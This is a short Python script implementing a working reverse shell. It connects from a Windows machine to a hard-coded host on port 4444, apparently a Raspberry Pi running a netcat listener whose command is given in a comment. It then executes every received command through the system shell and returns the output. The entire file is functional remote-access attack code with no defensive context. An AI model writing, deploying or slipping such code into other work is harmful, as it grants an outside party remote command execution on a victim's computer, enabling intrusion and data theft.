import socket
import subprocess
import os

#CONFIG
#Raspberry Pi IP address
SERVER_HOST = '192.168.1.147'  
#Port listening on the Raspberry Pi
SERVER_PORT = 4444    
# In the raspberry pi: nc -lnvp 4444


def perform_task_reverse_shell():
    print("Reverse shell task started")
    try:
        #Creation of the socket and connection to the server (RPI)
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((SERVER_HOST, SERVER_PORT))

        #First message:
        client.send(f"[*] Established connection from {os.name}\n".encode())

        #Loop to listen for commands and executing them
        while True:
            command = client.recv(1024).decode()
            
            #If received command is exit, exit the loop
            if command.lower() == 'exit':
                break

            #Execute commands on the Windows shell:
            output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                      stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            result = output.stdout.read() + output.stderr.read()

            #Send the client a response back:
            client.send(result or b"[*] Comand executed.\n")

        client.close()

    except Exception as e:
        print(f"Error: {e}")
